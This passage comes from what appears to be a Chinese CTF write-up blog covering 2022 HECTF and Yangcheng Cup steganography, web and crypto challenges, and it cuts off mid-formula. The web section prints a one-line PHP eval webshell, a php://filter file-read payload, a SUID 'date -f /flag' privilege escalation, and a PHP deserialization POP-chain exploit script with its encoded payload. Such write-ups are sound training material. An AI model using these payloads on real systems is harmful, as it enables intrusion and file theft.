title="来玩捉迷藏呀"></a>来玩捉迷藏呀</h3><blockquote><p>你能寻找到真正的我吗？</p></blockquote><p>png图片有lsb隐写，zsteg提取出内容： <code>zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txt</code>，</p><p>得到16进制字符串转string，再xor 0x33发现zip压缩包头，提取出zip压缩包，解压得到flag.doc，将文字全选设置颜色，发现flag：<code>HECTF&#123;hah0ha_Find-Me!!!&#125;</code>。</p><p>​    </p><h3 id="你把我flag藏哪去了"><a href="#你把我flag藏哪去了" class="headerlink" title="你把我flag藏哪去了?"></a>你把我flag藏哪去了?</h3><p>flag.docx中打开隐藏文字，得到的base64解码得第一段字符串：</p><p><code>kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky</code></p><p>otherflag.txt中含有零宽字符，利用在线网站提取出第二段字符串：</p><p><code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>看字符串无规律，猜测为字符频率统计，找一个<a href="https://uutool.cn/str-statistics/">在线工具</a>统计字符出现次数，按结果从大到小排序取出对应字符为 <code>flagkpomijnhuybrvdxezswq&#123;&#125;</code>，调整括号位置即为flag：<code>flag&#123;kpomijnhuybrvdxezswq&#125;</code>。</p><p>​    </p><h3 id="我的手要不行辣"><a href="#我的手要不行辣" class="headerlink" title="我的手要不行辣"></a>我的手要不行辣</h3><p>图片内文字用在线OCR识别转文字，hex转字符，根据文件头转存为zip压缩包，使用ARCHPR爆破出密码8686，解压得到txt内为音符加密，使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线解密工具</a>解密得到flag：<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code>。</p><p>​    </p><h3 id="2022HECTF调查问卷"><a href="#2022HECTF调查问卷" class="headerlink" title="2022HECTF调查问卷"></a>2022HECTF调查问卷</h3><p>写问卷得flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022年羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2022-09-04T05:46:20.000Z</published>
    <updated>2022-09-04T13:50:35.327Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。</p><p>大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。</p><p>本届大赛由【广外女生战队】与杭州安恒信息技术股份有限公司共同命题，采用CTF（夺旗赛）团队竞赛模式，参赛队伍通过互联网在线解题，题目类型涉及Web安全、逆向工程 (Reverse)、二进制漏洞挖掘和利用（Pwn）、密码学（Crypto）、杂项（Misc）等类别。</p><p>比赛时间：9月3日 9:00 - 9月4日 9:00</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><blockquote><p>简单web</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>非预期。Dirsearch扫一下发现他人上传的shell.php，利用file参数include+伪协议包含一下：</p><p><code>?file=php://filter/read=convert.base64-encode/resource=shell.php</code></p><p>base64解码得到源码：<code>&lt;?php @eval($_POST[a]);?&gt;</code></p><p>用蚁剑连接上，在根目录下发现flag，但是权限不够无法查看。</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code> 查看具有SUID权限的可执行文件，发现date命令可用，提权：</p><p><code>date -f /flag</code></p><p>在报错文字中获取flag内容。</p><p>​    </p><h3 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h3><blockquote><p>Wake up!Pop corn is not safe food,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;no pop&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>找反序列化pop链：</p><p><code>Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>由于类A存在过滤 <code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>，类A不能调类Test，利用上类Fun：</p><p><code>Fun/__call($f,$p)  &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fun</span>:</span><br><span class="line">    private_func = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_a = Fun()</span><br><span class="line">     </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="comment"># public_p = &#x27;ls /&#x27;</span></span><br><span class="line">    public_p = <span class="string">&#x27;cat /flag?&#x27;</span></span><br><span class="line">    public_a = A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>由于类Fun有 <code>__wakeup()</code> 会清空 <code>private $func</code>，修改数字绕过 <code>__wakeup()</code>：</p><p><code>O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</code></p><p>传入pop参数得到flag。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><blockquote><p>easy_misc</p></blockquote><p>一个vig.txt和一个zip压缩包，txt中文字</p><p><code>Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo</code></p><p>使用<a href="https://guballa.de/vigenere-solver">在线维吉尼亚密码解密网站</a>解出明文：</p><p><code>Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds</code></p><p>用密码 <code>GWHT@R1nd0yyds</code> 解压zip，得到一张bmp图，根据比赛中期放的hint提示加密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>, encoding=<span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        all_text = f.read()</span><br><span class="line"></span><br><span class="line">        im = encode(all_text)</span><br><span class="line">        im.save(<span class="string">&quot;out.bmp&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过爆破方法逆回原文本即可，发现原文为一本书，包含大量中文，还原时设置不输出中文，缩短运行时间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&#x27;out.bmp&#x27;</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       r,g,b = img.getpixel((x,y))</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):</span><br><span class="line">           <span class="keyword">if</span> ((j &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>) == g <span class="keyword">and</span> j &amp; <span class="number">0xFF</span> == b:</span><br><span class="line">               text+=<span class="built_in">chr</span>(j)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">pass</span></span><br><span class="line">       <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">           x = <span class="number">0</span></span><br><span class="line">           y += <span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">r&#x27;text.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(text)</span><br></pre></td></tr></table></figure><p>在得到的字符里，找到flag格式的且带有意义的字符，组成flag：<code>flag&#123;h1d3_1n_th3_p1ctur3&#125;</code>。</p><p>​    </p><h3 id="迷失幻境"><a href="#迷失幻境" class="headerlink" title="迷失幻境"></a>迷失幻境</h3><blockquote><p>走不出自责空间，沉溺于我们昨天，还能不能相见。</p></blockquote><p>用DiskGenius打开vmdk文件，在回收站发现一张可莉jpg图片和一张无文件类型后缀的幻境png图片，提取出来。</p><p>在“迷失幻境”夹子里有1张可莉jpg图片和100张一样的幻境png图片，前后相同图片的大小不同，尝试盲水印提取信息不成功，再尝试将幻境png大图与小图进行减（sub）操作，得到</p><p><img src="/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/solved.bmp" alt="solved" style="zoom:80%;"></p><p>key为 <code>可莉前来报道</code>。</p><p>回收站里可莉jpg图片存在备注信息 <code>猜不到，怎么想都猜不到吧。</code>，用outguess提取：</p><p><code>outguess -r keli.jpg -k &quot;可莉前来报道&quot; -t out.txt</code></p><p>得到flag：<code>DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;</code>。</p><p>​    </p><h3 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h3><blockquote><p>签个到，请注意，本次比赛所有 flag 提交时都只需要提交括号内的字符串，比如这个题的 flag 如果是 flag{xxx}, 您只需要提交 xxx 即可得分。</p></blockquote><p><code>ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===</code>，初看为base32，解码为乱码。</p><p><code>flag&#123;</code> 对应base32编码为 <code>MZWGCZ33</code>，故为rot13+base32，解码得 <code>flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LRSA"><a href="#LRSA" class="headerlink" title="LRSA"></a>LRSA</h3><blockquote><p>RSA and some other things</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPQ</span>(<span class="params">p,q</span>):</span><br><span class="line">    P=getPrime(<span class="number">2048</span>)</span><br><span class="line">    Q=getPrime(<span class="number">2048</span>)</span><br><span class="line">    t=(p*P-<span class="number">58</span>*P+q)%Q</span><br><span class="line">    <span class="keyword">assert</span> (isPrime(Q))</span><br><span class="line">    <span class="keyword">return</span> P,Q,t</span><br><span class="line"></span><br><span class="line">B=getRandomNBitInteger(<span class="number">11</span>)</span><br><span class="line">p=getPrime(B)</span><br><span class="line">q=getPrime(B)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">P,Q,t=getPQ(p,q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B=&quot;</span>,B)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*P*Q=&quot;</span>,P*P*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*Q*Q=&quot;</span>,P*Q*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t=&quot;</span>,t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br></pre></td></tr></table></figure></blockquote><p>$\gcd(P \cdot P \cdot Q,P \cdot Q \cdot Q)=P 